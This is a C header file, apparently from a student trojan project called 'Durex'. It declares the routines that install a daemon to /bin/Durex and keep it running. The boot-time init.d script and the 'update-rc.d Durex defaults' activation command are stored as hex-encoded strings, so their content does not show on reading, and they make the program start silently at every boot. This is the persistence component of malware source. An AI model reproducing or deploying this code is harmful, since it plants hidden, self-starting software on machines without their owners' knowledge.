/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.h                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/07/15 02:49:13 by root              #+#    #+#             */
/*   Updated: 2018/07/20 17:40:10 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef MAIN_H
# define MAIN_H

/* flock */
# include <sys/file.h>
/* close fork setsid dup2 chdir sleep write */
# include <unistd.h>
/* open umask */
# include <sys/types.h>
# include <sys/stat.h>
# include <fcntl.h>

# include "durex.h"

# define DUREX_BINARY_FILE	"/bin/Durex"
# define DUREX_LOCK_FILE	"/var/lock/durex.lock"
# define DUREX_SCRIPT_FILE	"/etc/init.d/Durex"
# define DUREX_SCRIPT		"\x23\x21\x20\x2f\x62\x69\x6e\x2f\x73\x68\x0d\x0a\x23\x2f\x65\x74\x63\x2f\x69\x6e\x69\x74\x2e\x64\x2f\x44\x75\x72\x65\x78\x0d\x0a\x23\x0d\x0a\x0d\x0a\x2e\x20\x2f\x6c\x69\x62\x2f\x6c\x73\x62\x2f\x69\x6e\x69\x74\x2d\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73\x0d\x0a\x0d\x0a\x44\x41\x45\x4d\x4f\x4e\x3d\x2f\x62\x69\x6e\x2f\x44\x75\x72\x65\x78\x0d\x0a\x0d\x0a\x73\x65\x74\x20\x2d\x65\x0d\x0a\x0d\x0a\x74\x65\x73\x74\x20\x2d\x78\x20\x24\x44\x41\x45\x4d\x4f\x4e\x20\x7c\x7c\x20\x65\x78\x69\x74\x20\x30\x0d\x0a\x0d\x0a\x63\x61\x73\x65\x20\x22\x24\x31\x22\x20\x69\x6e\x0d\x0a\x20\x20\x73\x74\x61\x72\x74\x29\x0d\x0a\x20\x20\x20\x20\x2f\x62\x69\x6e\x2f\x44\x75\x72\x65\x78\x0d\x0a\x20\x20\x20\x20\x3b\x3b\x0d\x0a\x20\x20\x73\x74\x6f\x70\x29\x0d\x0a\x20\x20\x20\x20\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x6b\x69\x6c\x6c\x20\x44\x75\x72\x65\x78\x0d\x0a\x20\x20\x20\x20\x3b\x3b\x0d\x0a\x20\x20\x2a\x29\x0d\x0a\x20\x20\x20\x20\x65\x63\x68\x6f\x20\x22\x55\x73\x61\x67\x65\x3a\x20\x2f\x65\x74\x63\x2f\x69\x6e\x69\x74\x2e\x64\x2f\x44\x75\x72\x65\x78\x20\x7b\x73\x74\x61\x72\x74\x7c\x73\x74\x6f\x70\x7d\x22\x20\x3e\x26\x32\x0d\x0a\x20\x20\x20\x20\x65\x78\x69\x74\x20\x31\x0d\x0a\x20\x20\x20\x20\x3b\x3b\x0d\x0a\x65\x73\x61\x63\x0d\x0a\x0d\x0a\x65\x78\x69\x74\x20\x30\x0d\x0a"
# define DUREX_ACTIVATE_SCRIPT	"\x75\x70\x64\x61\x74\x65\x2d\x72\x63\x2e\x64\x20\x44\x75\x72\x65\x78\x20\x64\x65\x66\x61\x75\x6c\x74\x73"

typedef struct	s_env
{
	int			lock;
	t_sv		server;
}				t_env;

t_env			e;

void			durex();
void			install_binary(int durex);
void			durexSigterm(int sig);
void			quitClearlyDaemon();

#endif
